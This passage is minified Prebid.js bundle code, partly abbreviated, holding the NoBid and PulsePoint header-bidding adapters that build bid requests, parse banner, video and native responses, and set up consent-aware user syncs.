      interpretResponse: function (e, n) {
        return c("interpretResponse -> serverResponse", e), c("interpretResponse -> bidRequest", n), b(e.body, n);
      },
      getUserSyncs: function (e, n, t, r) {
        if (e.iframeEnabled) {
          var o = "";
          return t && "string" == typeof t.consentString && ("boolean" == typeof t.gdprApplies ? o += "?gdpr=".concat(Number(t.gdprApplies), "&gdpr_consent=").concat(t.consentString) : o += "?gdpr_consent=".concat(t.consentString)), r && (o.length > 0 ? o += "&" : o += "?", o += "usp_consent=" + r), [{
            type: "iframe",
        ...
        if (e.pixelEnabled && n.length > 0) {
          var d = [];
          return n[0].body.syncs && n[0].body.syncs.length > 0 && n[0].body.syncs.forEach(function (e) {
            d.push({
              type: "image",
              url: e
            });
        ...
        return Object(i.logWarn)("-NoBid- Please enable iframe based user sync.", e), [];
      },
      onTimeout: function (e) {
        return window.nobid.timeoutTotal++, c("Timeout total: " + window.nobid.timeoutTotal, e), window.nobid.timeoutTotal;
      },
      onBidWon: function (e) {
        return window.nobid.bidWonTotal++, c("BidWon total: " + window.nobid.bidWonTotal, e), window.nobid.bidWonTotal;
      }
    };
    Object(o.registerBidder)(l), window.pbjs.installedModules.push("nobidBidAdapter");
  }
}, [677]);
pbjsChunk([184], {
  695: function (e, t, n) {
...
pbjsChunk([162], {
  ...
  759: function (e, r, t) {
    ...
    var s = 100,
      ...
      p = 50,
      l = "USD",
      m = ["cp", "ct", "cf", "video", "battr", "bcat", "badv", "bidfloor"],
      f = {
        code: "pulsepoint",
        gvlid: 81,
        ...
        interpretResponse: function (e, r) {
          return function (e, r) {
            ...
            e.data.imp.forEach(function (e) {
              t[e.id] = e;
            }), s && s.seatbid.forEach(function (e) {
            ...
            return Object.keys(t).forEach(function (e) {
              if (i[e]) {
                var r = {
                  ...
                  currency: s.cur || l,
                  meta: {
                    advertiserDomains: i[e].adomain || []
                  }
                };
                t[e].video ? (d[e] && "outstream" === Object(n.deepAccess)(d[e], "mediaTypes.video.context") && (r.renderer = (o = Object(n.deepAccess)(d[e], "renderer.options"), c = Object(n.deepAccess)(i[e], "ext.outstream"), (p = a.a.install({
                  url: c.rendererUrl,
                  config: {
                    defaultOptions: c.config,
                    rendererOptions: o,
                    type: c.type
                  },
                  loaded: !1
                ...
                }), p)), r.vastXml = i[e].adm, r.mediaType = "video", r.width = i[e].w, r.height = i[e].h) : t[e].banner ? (r.ad = i[e].adm, r.width = i[e].w || t[e].banner.w, r.height = i[e].h || t[e].banner.h) : t[e].native && (r.native = function (e, r) {
                  if (e.native) {
                    var t = function (e) {
                        try {
                          if (e) return JSON.parse(e);
                        } catch (e) {
                          Object(n.logError)("pulsepointLite.safeParse", "ERROR", e);
                        }
                        return null;
                      }(r.adm),
                      i = {};
                    if (t && t.native && t.native.assets) return t.native.assets.forEach(function (e) {
                      i.title = e.title ? e.title.text : i.title, i.body = e.data && 2 === e.data.type ? e.data.value : i.body, i.sponsoredBy = e.data && 1 === e.data.type ? e.data.value : i.sponsoredBy, i.image = e.img && 3 === e.img.type ? e.img.url : i.image, i.icon = e.img && 1 === e.img.type ? e.img.url : i.icon;
                    }), t.native.link && (i.clickUrl = encodeURIComponent(t.native.link.url)), i.impressionTrackers = t.native.imptrackers, i;
                  }
                  return null;
                }(t[e], i[e]), r.mediaType = "native"), u.push(r);
              }
              var o, c, p;
            }), u;
          }(r, e);
    ...
    function b(e) {
      var r = function (e) {
          var r = Object(n.deepAccess)(e, "mediaTypes.banner.sizes");
          if (r && Object(n.isArray)(r)) return r.filter(function (e) {
            return Object(n.isArray)(e) && 2 === e.length;
          }).map(function (e) {
            return {
              w: e[0],
              h: e[1]
        ...
        t = function (e, r) {
          if (e.params.cf) {
            ...
            return [parseInt(e.params.cw || t[0], 10), parseInt(e.params.ch || t[1], 10)];
          }
          if (r && r.length > 0) return [r[0].w, r[0].h];
          return [1, 1];
        }(e, r);
    ...
    function v(e) {
      return e.params.video ? d({}, e.params.video, e.mediaTypes && e.mediaTypes.video ? e.mediaTypes.video : {}, {
        battr: e.params.battr
      }) : null;
    }
    function g(e) {
      ...
      return m.forEach(function (e) {
        return t[e] = 1;
      }), Object.keys(e.params).forEach(function (n) {
        t[n] || (r[n] = e.params[n]);
    ...
    function h(e) {
      if (e.nativeParams) {
        ...
        return y(r, function (e, r, t) {
          ...
          return null;
        }(r.length + 1, e.nativeParams.title, s)), y(r, O(r.length + 1, e.nativeParams.body, 2, u)), y(r, O(r.length + 1, e.nativeParams.sponsoredBy, 1, o)), y(r, I(r.length + 1, e.nativeParams.icon, 1, p, p)), y(r, I(r.length + 1, e.nativeParams.image, 3, c, c)), {
    ...
    function w(e, r) {
      var t = e && e.length > 0 ? e[0].params.cp : "0";
      return e[0].params.app ? null : {
        publisher: {
          id: t.toString()
        },
        ref: T(),
        page: r && r.refererInfo ? r.refererInfo.referer : ""
      };
    }
    function j(e) {
      var r = e && e.length > 0 ? e[0].params.cp : "0",
        t = e[0].params.app;
      return t ? {
        publisher: {
          id: r.toString()
    ...
    function k(e, r) {
      var t = {};
      if (r && r.gdprConsent && (t.consent = r.gdprConsent.consentString), e && e.userId) {
        ...
        var i = e.userId.digitrustid;
        if (i && i.data) {
          var a = {};
          i.data.id && (a.id = i.data.id), i.data.keyv && (a.keyv = i.data.keyv), t.digitrust = a;
        }
      }
      return {
        ext: t
    ...
    function R(e) {
      var r = e.params.bidfloor;
      if (Object(n.isFn)(e.getFloor)) {
        var t = e.getFloor({
          mediaType: e.mediaTypes.banner ? "banner" : e.mediaTypes.video ? "video" : "Native",
          size: "*",
          currency: l
        });
        t && t.floor && (r = t.floor);
    ...
    Object(i.registerBidder)(f), window.pbjs.installedModules.push("pulsepointBidAdapter");
  }
}, [758]);
pbjsChunk([141], {
  812: function (n, i, e) {
